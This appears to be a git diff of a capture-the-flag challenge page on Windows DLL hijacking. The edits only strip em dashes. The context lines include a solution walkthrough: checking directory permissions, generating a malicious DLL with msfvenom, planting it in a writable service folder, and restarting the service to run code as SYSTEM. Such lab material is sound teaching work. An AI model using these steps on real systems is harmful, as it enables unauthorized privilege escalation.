@@ -1,4 +1,4 @@
-# Challenge 1 — DLL Hijacking
+# Challenge 1  DLL Hijacking
 
 **Difficulty:** Medium
 **Category:** Windows Privilege Escalation
@@ -9,10 +9,10 @@
 ## Story
 
 A monitoring service is running as SYSTEM. You found its application directory
-and a README inside listing the DLLs it loads. One of them is loaded by name only —
+and a README inside listing the DLLs it loads. One of them is loaded by name only 
 no full path. You can write to that directory.
 
-You are `ctfplayer` — a standard user.
+You are `ctfplayer`  a standard user.
 
 ---
 
@@ -43,7 +43,7 @@ Windows searches for it in this order:
 
 If the application directory is writable and the DLL does not exist there yet,
 you can plant a malicious DLL in that location. The next time the service starts,
-your DLL loads in the service's process — which runs as SYSTEM.
+your DLL loads in the service's process  which runs as SYSTEM.
 
 ---
 
@@ -96,9 +96,9 @@ Restart-Service MonitoringService
 ## Solution
 
 <details>
-<summary>Click to reveal — try on your own first!</summary>
+<summary>Click to reveal  try on your own first!</summary>
 
-### Step 1 — Identify the target DLL
+### Step 1  Identify the target DLL
 
 ```powershell
 type "C:\Apps\MonitoringTool\README.txt"
@@ -107,7 +107,7 @@ icacls "C:\Apps\MonitoringTool"
 
 `helper.dll` is loaded from the application directory, and `ctfplayer` has write access.
 
-### Step 2 — Generate the malicious DLL (on Kali)
+### Step 2  Generate the malicious DLL (on Kali)
 
 ```bash
 msfvenom -p windows/x64/exec \
@@ -115,7 +115,7 @@ msfvenom -p windows/x64/exec \
   -f dll -o helper.dll
 ```
 
-### Step 3 — Drop the DLL into the application directory
+### Step 3  Drop the DLL into the application directory
 
 Transfer `helper.dll` to the Windows VM, then:
 
@@ -123,7 +123,7 @@ Transfer `helper.dll` to the Windows VM, then:
 Copy-Item helper.dll "C:\Apps\MonitoringTool\helper.dll"
 ```
 
-### Step 4 — Restart the service
+### Step 4  Restart the service
 
 ```powershell
 Restart-Service MonitoringService
@@ -132,7 +132,7 @@ Restart-Service MonitoringService
 The service loads `helper.dll` from its own directory before checking System32.
 Your DLL executes as SYSTEM.
 
-### Step 5 — Read the flag
+### Step 5  Read the flag
 
 ```powershell
 type C:\Users\Public\flag.txt
